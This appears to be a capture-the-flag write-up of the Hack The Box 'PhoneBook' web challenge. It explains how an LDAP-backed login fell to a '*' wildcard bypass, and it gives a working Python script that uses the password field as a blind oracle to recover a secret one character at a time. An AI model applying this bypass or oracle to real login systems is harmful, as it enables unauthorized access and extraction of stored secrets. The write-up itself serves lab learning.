---
layout: post
title: "PhoneBook (HTB web)"
subtitle: "ldap injection: wildcard auth bypass, then a blind oracle to rebuild the flag"
date: 2023-02-02
tags: [htb, ctf, web, ldap-injection]
category: writeups
tldr: "Login was backed by LDAP and accepted user=* and pass=* as a wildcard bypass. The password field was also injectable as a blind oracle: posting the admin Reese with a partial flag plus a wildcard returned a non-failure page only when the prefix matched, so I looped characters to rebuild the flag one at a time."
---

## the challenge

The target was a phonebook login. The footer read `PhoneBook 9.8.2020`. A failed login redirected to `?message=Authentication failed`, which gave me a clean signal to compare against.

## the bug

The login query was LDAP-backed and built from the raw input. Sending `*` in both fields authenticated:

```text
user: *
pass: *
```

A wildcard matches any entry, so the filter always returned a result. Once in, the search field also took a wildcard: searching `*` dumped every record, and the admin entry was Reese:

```text
*Reese : Kyle Reese    reese@skynet.com    555-1234567
```

The interesting part was that the password field was injectable as a blind oracle. Submitting `Reese` as the username and a flag prefix ending in `*` as the password made the LDAP filter test whether the stored value started with that prefix. A correct prefix returned the normal page, a wrong one redirected to `Authentication failed`.

## the solve

I scripted the oracle. For each candidate character I posted `username=Reese` and `password=<known>+<char>+*}`, and checked whether the response URL was the failure redirect. No redirect meant the character was right, so I appended it and reset the search:

```python
import requests, string

url = "http://TARGET/login"
chars = string.ascii_letters + ''.join(
    ['0','1','2','3','4','5','6','7','8','9','`','~','!','@','$','%','&','-','_',"'"])

counter = 0
flag = "HTB{"

while True:
    if counter == len(chars):
        print(flag + "}")
        break
    password = flag + chars[counter] + "*}"
    data = {"username": "Reese", "password": password}
    response = requests.post(url, data=data)
    if response.url != url + "?message=Authentication%20failed":
        flag += chars[counter]
        counter = 0
    else:
        counter += 1
```

## the flag

The loop walked the charset for each position, kept the matching characters, and stopped when no character extended the prefix. The reconstructed string was the flag in the `HTB{...}` form.
